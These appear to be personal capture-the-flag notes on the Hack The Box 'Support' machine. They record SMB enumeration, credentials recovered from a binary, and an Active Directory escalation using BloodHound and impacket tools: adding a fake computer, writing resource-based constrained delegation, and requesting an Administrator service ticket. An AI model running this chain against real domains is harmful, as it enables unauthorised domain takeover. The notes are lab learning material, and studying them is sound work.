fix newbox script,
workflow, openvpn first before anything
$ip not set properly 
~shared disappeared

consider getting autorecon later

SMB
When you look at your `smbclient` or `smbmap` output, mentally cross off `ADMIN$`, `C$`, `IPC$`, `NETLOGON`, and `SYSVOL`.
we got support-tools

```
```
```bash
monodis --userstrings UserInfo.exe
```

loots
```bash
ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```
```bash
support:Ironside47pleasure40Watchful
log in through evil-winrm
```

port 5985 http is for winrm. 
port 5986 https is for secure winrm
```bash
window flags often located in desktop
```

To check on win for domain privilege:
`net user support /domain`

```bash
bloodhound-python -u 'support' -p 'Ironside47pleasure40Watchful' -d 'support.htb' -ns $IP -c All --zip

sudo 
bloodhound-start
```

**Running Bloodhound gives**
Support -member of -> shared support account -genericall-> dc.support.htb -coercetotgt-> support.htb (root) -> contains -> users -> admins


**add fake computer**
``` bash
impacket-addcomputer -dc-ip $IP 'support.htb/support:Ironside47pleasure40Watchful' -computer-name 'ATTACKVM' -computer-pass 'ComputerPassword123!'
```
**add delegation list**
```bash
impacket-rbcd -dc-ip $IP -action write -delegate-to 'ATTACKVM$' -object 'DC$' 'support.htb/support:Ironside47pleasure40Watchful'
```

**Coerce the TGT / Ticket (S4U2Self)**
```bash
impacket-getST -dc-ip 10.129.6.177 -spn 'cifs/DC.support.htb' -impersonate 'Administrator' 'support.htb/ATTACKVM:ComputerPassword123!'
```